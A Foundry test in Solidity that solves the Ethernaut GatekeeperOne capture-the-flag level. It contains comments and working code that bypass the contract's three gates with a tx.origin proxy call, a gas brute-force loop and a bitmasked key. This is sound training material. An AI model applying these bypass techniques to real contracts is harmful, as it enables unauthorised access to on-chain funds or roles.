// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/GatekeeperOne/GatekeeperOneFactory.sol";
import "../src/Ethernaut.sol";

// forge test --match-contract GatekeeperOneTest -vvvv
contract GatekeeperOneTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our address 5 ether
    }

    function testGatekeeperOneHack() public {
        /****************
         * Factory setup *
         *************** */
        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(
            gatekeeperOneFactory
        );
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(
            payable(levelAddress)
        );
        vm.stopPrank();

        /****************
         *    Attack     *
         *************** */
        /*
         * In this level, the goal is to become the entrant but there are 3 modifier  blocking us straight
         * How to defeat them ?
         *  I see here 2 solution :
         *
         *  --1--
         * gateOne -> we need `msg.sender != tx.origin`.
         *   In our case we start the prank as Player, but our hack contract will call the enter function
         *   => msg.sender -> hack contract
         *   => tx.origin -> player
         * gateTwo -> during our call we need to set the gas amount as a multiple of 8191 , so modulo will be 0
         *   The idea is to make a loop with a try catch and make a call to the function
         *   On each interation of the loop we will add some gas
         *   A basic for loop will help us find the right value.
         * gateThree -> this one is a bit tricker, you need to catch up with casting and masking
         *   1. uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
         *      means => 0x11111111 == 0x1111 so the only possible is to "mask" as following 0x0000FFFF
         *   2. uint32(uint64(_gateKey)) != uint64(_gateKey),
         *      means => 0x1111111100001111 != 0x00001111 "mask" as following 0xFFFFFFFF0000FFFF
         *   3. uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
         *      we can know calculate the keys as below
         *  --2--
         *
         */
        vm.startPrank(player);

        /*
        * Gate key, 2 solutions:
        */

        // bytes4 halfKey = bytes4(
        //     bytes.concat(bytes2(uint16(0)), bytes2(uint16(uint160(tx.origin))))
        // );
        // bytes8 gateKey = bytes8(bytes.concat(halfKey, halfKey));

        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
          // applying the mask "0xFFFFFFFF0000FFFF"

        // Solution 1
        // for (uint256 i = 0; i <= 8191; i++) {
        //     try ethernautGatekeeperOne.enter{gas: 97370 + i}(gateKey) {
        //         emit log_named_uint("Pass - Gas", 97370 + i);
        //         break;
        //     } catch {
        //         // emit log_named_uint("Fail - Gas", 97000 + i);
        //     }
        // }

        // Solution 2
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(ethernautGatekeeperOne).call{
                gas: i + 90000
            }(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                break;
            }
        }


        assertEq(ethernautGatekeeperOne.entrant(), tx.origin);
        vm.stopPrank();
        vm.prank(tx.origin);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
